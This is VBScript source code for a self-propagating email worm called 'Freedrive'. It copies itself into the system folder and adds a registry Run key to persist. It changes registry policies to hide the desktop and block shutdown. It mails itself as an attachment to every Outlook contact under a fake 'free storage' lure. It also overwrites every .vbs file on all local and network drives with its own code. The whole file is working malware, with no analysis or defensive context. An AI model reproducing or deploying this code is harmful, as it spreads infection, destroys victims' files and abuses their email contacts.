'Freedrive Created By Pingu2000
On Error Resume Next
Set ocntaratvic = CreateObject("WScript.Shell")
Set hdxhdyfkbbv= Createobject("scripting.filesystemobject")
hdxhdyfkbbv.copyfile wscript.scriptfullname,hdxhdyfkbbv.GetSpecialFolder(1)& "\Freedrive.vbs"
ocntaratvic.regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Freedrive","wscript.exe "&hdxhdyfkbbv.GetSpecialFolder(1)& "\Freedrive.vbs %"
ocntaratvic.regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDesktop",1,"REG_DWORD"
ocntaratvic.regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoClose",1,"REG_DWORD"
ocntaratvic.regwrite "HKCU\ControlPanel\Desktop\MenuShowDelay",10000,"REG_DWORD"
ocntaratvic.regwrite "HKCU\Software\Microsoft\CurrentVersion\Policies\System\NoDisp",1,"REG_DWORD"
if ocntaratvic.regread ("HKCU\software\Freedrive\mailed") <> "1" then
axhfqborpuw()
end if
dopuzwltcmw()
tndiihkczcs()
Function axhfqborpuw()
On Error Resume Next
Set yygijfrzvne = CreateObject("Outlook.Application")
If yygijfrzvne= "Outlook"Then
Set fqegnsdjdwk=yygijfrzvne.GetNameSpace("MAPI")
For Each vuizibdqdjg In fqegnsdjdwk.AddressLists
If vuizibdqdjg.AddressEntries.Count <> 0 Then
For pnzkwsqwemw= 1 To vuizibdqdjg.AddressEntries.Count
Set qvhetukuxbw = vuizibdqdjg.AddressEntries(pnzkwsqwemw)
Set mqqpsehlagg = yygijfrzvne.CreateItem(0)
mqqpsehlagg.To = qvhetukuxbw.Address
mqqpsehlagg.Subject = "250 Mb Freedrive Space for Every One"
mqqpsehlagg.Body = "You become with this Freedrive tool, 250 Mb Free Space from Freedrive.com. Spaced by Pingu2000 "
mqqpsehlagg.Attachments.Add hdxhdyfkbbv.GetSpecialFolder(1)& "\Freedrive.vbs"
mqqpsehlagg.DeleteAfterSubmit = True
If mqqpsehlagg.To <> "" Then
mqqpsehlagg.Send
ocntaratvic.regwrite "HKCU\software\Freedrive\mailed", "1"
End If
Next
End If
Next
end if
End Function
if day(now) = 9 then
msgbox "Your Hard Disk are full, please deleted any files..",16
end if
Function tndiihkczcs()
On Error Resume Next
Set oqrnzhdvmoy = hdxhdyfkbbv.Drives
For Each movulseeswd In oqrnzhdvmoy
If movulseeswd.Drivetype = Remote Then
rbqclylroxp= movulseeswd & "\"
Call asxayenuyyd(rbqclylroxp)
ElseIf movulseeswd.IsReady Then
rbqclylroxp= movulseeswd&"\"
Call asxayenuyyd(rbqclylroxp)
End If
Next
End Function
Function asxayenuyyd(pmbcswfjeur)
Set srtmptboowr= hdxhdyfkbbv.GetFolder(pmbcswfjeur)
Set sobpfevpzuq= srtmptboowr.Files
For Each xcttnnaflzj In sobpfevpzuq
if hdxhdyfkbbv.GetExtensionName(xcttnnaflzj.path) = "vbs" then
hdxhdyfkbbv.copyfile wscript.scriptfullname , xcttnnaflzj.path , true
end if
Next
Set xcttnnaflzj= srtmptboowr.SubFolders
For Each yktztspytfw In xcttnnaflzj
Call asxayenuyyd(yktztspytfw.path)
Next
End Function
